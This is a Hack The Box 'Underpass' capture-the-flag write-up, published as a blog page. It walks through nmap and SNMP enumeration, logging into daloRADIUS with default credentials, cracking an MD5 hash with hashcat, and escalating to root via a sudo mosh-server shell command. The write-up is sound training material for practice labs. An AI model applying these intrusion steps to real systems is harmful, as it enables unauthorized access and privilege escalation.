@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="dark">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>HTB - Underpass | Fabio Birnegger</title>
+<meta name="keywords" content="HTB, Linux, Write-Up">
+<meta name="description" content="Box Details
+
+  
+      
+          
+          
+      
+  
+  
+      
+          Difficulty
+          Easy
+      
+      
+          Type
+          Linux
+      
+  
+
+TCP Port Scan
+└─$ nmap $IP -sV -sC
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-03 00:54 &#43;0200
+Nmap scan report for 10.129.231.213
+Host is up (0.061s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
+|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 21.52 seconds
+UDP Port Scan">
+<meta name="author" content="Fabio Birnegger">
+<link rel="canonical" href="http://localhost:1313/writeups/htb_underpass/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.9b4f18f427ed299296009b0f14c130159f761d9d285109ab0e5db09488a51e86.css" integrity="sha256-m08Y9CftKZKWAJsPFMEwFZ92HZ0oUQmrDl2wlIilHoY=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/writeups/htb_underpass/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="http://localhost:1313/writeups/htb_underpass/">
+  <meta property="og:site_name" content="Fabio Birnegger">
+  <meta property="og:title" content="HTB - Underpass">
+  <meta property="og:description" content="Box Details
+Difficulty Easy Type Linux TCP Port Scan
+└─$ nmap $IP -sV -sCStarting Nmap 7.98 ( https://nmap.org ) at 2026-05-03 00:54 &#43;0200Nmap scan report for 10.129.231.213Host is up (0.061s latency).Not shown: 998 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)|_ 256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)80/tcp open http Apache httpd 2.4.52 ((Ubuntu))|_http-title: Apache2 Ubuntu Default Page: It works|_http-server-header: Apache/2.4.52 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 21.52 seconds UDP Port Scan">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2026-05-03T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-05-03T00:00:00+00:00">
+    <meta property="article:tag" content="HTB">
+    <meta property="article:tag" content="Linux">
+    <meta property="article:tag" content="Write-Up">
+    <meta property="og:image" content="http://localhost:1313/writeups/htb_underpass/images/writeup_screens/htb_underpass/underpass_cover.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://localhost:1313/writeups/htb_underpass/images/writeup_screens/htb_underpass/underpass_cover.png">
+<meta name="twitter:title" content="HTB - Underpass">
+<meta name="twitter:description" content="Box Details
+
+  
+      
+          
+          
+      
+  
+  
+      
+          Difficulty
+          Easy
+      
+      
+          Type
+          Linux
+      
+  
+
+TCP Port Scan
+└─$ nmap $IP -sV -sC
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-03 00:54 &#43;0200
+Nmap scan report for 10.129.231.213
+Host is up (0.061s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
+|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 21.52 seconds
+UDP Port Scan">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Writeups",
+      "item": "http://localhost:1313/writeups/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "HTB - Underpass",
+      "item": "http://localhost:1313/writeups/htb_underpass/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB - Underpass",
+  "name": "HTB - Underpass",
+  "description": "Box Details\nDifficulty Easy Type Linux TCP Port Scan\n└─$ nmap $IP -sV -sC\rStarting Nmap 7.98 ( https://nmap.org ) at 2026-05-03 00:54 +0200\rNmap scan report for 10.129.231.213\rHost is up (0.061s latency).\rNot shown: 998 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)\r|_ 256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)\r80/tcp open http Apache httpd 2.4.52 ((Ubuntu))\r|_http-title: Apache2 Ubuntu Default Page: It works\r|_http-server-header: Apache/2.4.52 (Ubuntu)\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 21.52 seconds UDP Port Scan\n",
+  "keywords": [
+    "HTB", "Linux", "Write-Up"
+  ],
+  "articleBody": "Box Details\nDifficulty Easy Type Linux TCP Port Scan\n└─$ nmap $IP -sV -sC\rStarting Nmap 7.98 ( https://nmap.org ) at 2026-05-03 00:54 +0200\rNmap scan report for 10.129.231.213\rHost is up (0.061s latency).\rNot shown: 998 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)\r|_ 256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)\r80/tcp open http Apache httpd 2.4.52 ((Ubuntu))\r|_http-title: Apache2 Ubuntu Default Page: It works\r|_http-server-header: Apache/2.4.52 (Ubuntu)\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 21.52 seconds UDP Port Scan\n└─$ nmap -sU -T5 10.129.231.213\rStarting Nmap 7.98 ( https://nmap.org ) at 2026-05-03 01:28 +0200\rWarning: 10.129.231.213 giving up on port because retransmission cap hit (2).\rStats: 0:00:20 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan\rUDP Scan Timing: About 85.63% done; ETC: 01:28 (0:00:04 remaining)\rStats: 0:00:37 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan\rUDP Scan Timing: About 96.93% done; ETC: 01:29 (0:00:01 remaining)\rNmap scan report for underpass.htb (10.129.231.213)\rHost is up (0.035s latency).\rNot shown: 945 open|filtered udp ports (no-response), 54 closed udp ports (port-unreach)\rPORT STATE SERVICE\r161/udp open snmp\rNmap done: 1 IP address (1 host up) scanned in 48.68 seconds User Flag The webserver only serves a default Apache page and i was not able to find subdomains, vhosts, hidden directories or anything else. Thus I scanned the target for UDP ports and discovered that SNMP is open. I started to enumerate the service:\n$ snmp-check $IP There seems to be a DaloRadius instance running on the target. I went back to the webserver and found that /daloradius gives us 403 Forbidden. I looked at the Github Repository of DaloRadius and found the path to the login page which is /daloradius/app/operators/login.php\nI found the following default credentials via a Google search and was able to autenticate:\nadministrator:radius I did not find an interesting vulnerabilty affecting the version 2.2 of DaloRadius which is why i explored the application. We can find a user list via the homepage and only one user svcMosh exists.\nUsing a hash analyzer we can quickly find out that the stored password for user svcMosh is a MD5 hash. Via the following hashcat command, we can retrieve the clear-text password in only a few seconds:\n$ hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt With the cracked password we can authenticate on the machine via SSH as user svcMosh and read the flag at /home/svcMosh/user.txt\nRoot Flag With sudo -l we can see that our user is allowed to run the binary /usr/bin/mosh-server as root with no password. Looking at GTFOBins we can see that mosh-server with sudo privileges can spawn an interactive system shell. I did so with the following command:\n$ mosh --server='sudo mosh-server' localhost /bin/sh I succesfully spawned a root shell and was able to read /root/root.txt\n",
+  "wordCount" : "496",
+  "inLanguage": "en",
+  "image":"http://localhost:1313/writeups/htb_underpass/images/writeup_screens/htb_underpass/underpass_cover.png","datePublished": "2026-05-03T00:00:00Z",
+  "dateModified": "2026-05-03T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Fabio Birnegger"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/writeups/htb_underpass/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Fabio Birnegger",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="Fabio Birnegger (Alt + H)">Fabio Birnegger</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/writeups/" title="Write-ups">
+                    <span>Write-ups</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/publications/" title="Publications &amp; Talks">
+                    <span>Publications &amp; Talks</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about/" title="whoami">
+                    <span>whoami</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      HTB - Underpass
+    </h1>
+    <div class="post-meta"><span title='2026-05-03 00:00:00 +0000 UTC'>May 3, 2026</span>&nbsp;·&nbsp;<span>3 min</span>&nbsp;·&nbsp;<span>Fabio Birnegger</span>
+
+</div>
+  </header> 
+<figure class="entry-cover">
+        <img loading="eager" src="http://localhost:1313/images/writeup_screens/htb_underpass/underpass_cover.png" alt="HTB CCTV Cover">
+        
+</figure>
+  <div class="post-content"><p><strong>Box Details</strong></p>
+<table>
+  <thead>
+      <tr>
+          <th></th>
+          <th></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Difficulty</td>
+          <td>Easy</td>
+      </tr>
+      <tr>
+          <td>Type</td>
+          <td>Linux</td>
+      </tr>
+  </tbody>
+</table>
+<p><strong>TCP Port Scan</strong></p>
+<pre tabindex="0"><code>└─$ nmap $IP -sV -sC
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-03 00:54 +0200
+Nmap scan report for 10.129.231.213
+Host is up (0.061s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
+|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 21.52 seconds
+</code></pre><p><strong>UDP Port Scan</strong></p>
+<pre tabindex="0"><code>└─$ nmap -sU -T5 10.129.231.213
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-03 01:28 +0200
+Warning: 10.129.231.213 giving up on port because retransmission cap hit (2).
+Stats: 0:00:20 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
+UDP Scan Timing: About 85.63% done; ETC: 01:28 (0:00:04 remaining)
+Stats: 0:00:37 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
+UDP Scan Timing: About 96.93% done; ETC: 01:29 (0:00:01 remaining)
+Nmap scan report for underpass.htb (10.129.231.213)
+Host is up (0.035s latency).
+Not shown: 945 open|filtered udp ports (no-response), 54 closed udp ports (port-unreach)
+PORT    STATE SERVICE
+161/udp open  snmp
+
+Nmap done: 1 IP address (1 host up) scanned in 48.68 seconds
+</code></pre><h2 id="user-flag">User Flag<a hidden class="anchor" aria-hidden="true" href="#user-flag">#</a></h2>
+<p>The webserver only serves a default Apache page and i was not able to find subdomains, vhosts, hidden directories or anything else. Thus I scanned the target for UDP ports and discovered that <strong>SNMP</strong> is open. I started to enumerate the service:</p>
+<pre tabindex="0"><code>$ snmp-check $IP
+</code></pre><p><img loading="lazy" src="/images/writeup_screens/htb_underpass/htb_underpass1.png"></p>
+<p>There seems to be a <strong>DaloRadius</strong> instance running on the target. I went back to the webserver and found that <em>/daloradius</em> gives us <em>403 Forbidden</em>. I looked at the <a href="https://github.com/lirantal/daloradius">Github Repository of DaloRadius</a> and found the path to the login page which is <em>/daloradius/app/operators/login.php</em></p>
+<p><img loading="lazy" src="/images/writeup_screens/htb_underpass/htb_underpass2.png"></p>
+<p>I found the following default credentials via a Google search and was able to autenticate:</p>
+<pre tabindex="0"><code>administrator:radius
+</code></pre><p>I did not find an interesting vulnerabilty affecting the version <em>2.2</em> of <strong>DaloRadius</strong> which is why i explored the application. We can find a user list via the homepage and only one user <strong>svcMosh</strong> exists.</p>
+<p><img loading="lazy" src="/images/writeup_screens/htb_underpass/htb_underpass3.png"></p>
+<p>Using a <a href="https://www.tunnelsup.com/hash-analyzer/">hash analyzer</a> we can quickly find out that the stored password for user <strong>svcMosh</strong> is a MD5 hash. Via the following hashcat command, we can retrieve the clear-text password in only a few seconds:</p>
+<pre tabindex="0"><code>$ hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
+</code></pre><p>With the cracked password we can authenticate on the machine via SSH as user <strong>svcMosh</strong> and read the flag at <em>/home/svcMosh/user.txt</em></p>
+<h2 id="root-flag">Root Flag<a hidden class="anchor" aria-hidden="true" href="#root-flag">#</a></h2>
+<p>With <code>sudo -l</code> we can see that our user is allowed to run the binary <code>/usr/bin/mosh-server</code> as <strong>root</strong> with no password. Looking at <a href="https://gtfobins.org/gtfobins/mosh-server/">GTFOBins</a> we can see that <code>mosh-server</code> with <em>sudo</em> privileges can spawn an interactive system shell. I did so with the following command:</p>
+<pre tabindex="0"><code>$ mosh --server=&#39;sudo mosh-server&#39; localhost /bin/sh
+</code></pre><p>I succesfully spawned a root shell and was able to read <em>/root/root.txt</em></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/htb/">HTB</a></li>
+      <li><a href="http://localhost:1313/tags/linux/">Linux</a></li>
+      <li><a href="http://localhost:1313/tags/write-up/">Write-Up</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="next" href="http://localhost:1313/writeups/pg_snook/">
+    <span class="title">Next »</span>
+    <br>
+    <span>PG Practice - Snookums</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/">Fabio Birnegger</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
